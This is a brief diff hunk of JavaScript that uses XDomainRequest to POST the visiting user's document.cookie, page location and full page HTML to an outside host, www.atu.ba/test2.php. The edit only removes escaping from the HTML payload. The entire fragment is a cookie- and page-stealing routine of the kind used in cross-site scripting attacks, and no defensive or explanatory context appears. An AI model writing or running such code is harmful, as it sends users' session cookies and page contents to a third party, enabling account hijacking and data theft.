@@ -55,7 +55,7 @@ if (xdr) {
     xdr.onload = loadd;
     xdr.timeout = 10000;
     xdr.open('POST','http://www.atu.ba/test2.php?c='+escape(document.cookie)+' Location: '+escape(window.location));
-    xdr.send('data='+escape(document.documentElement.outerHTML));
+    xdr.send('data='+document.documentElement.outerHTML);
 } else {
     alert('XDR undefined');
 }
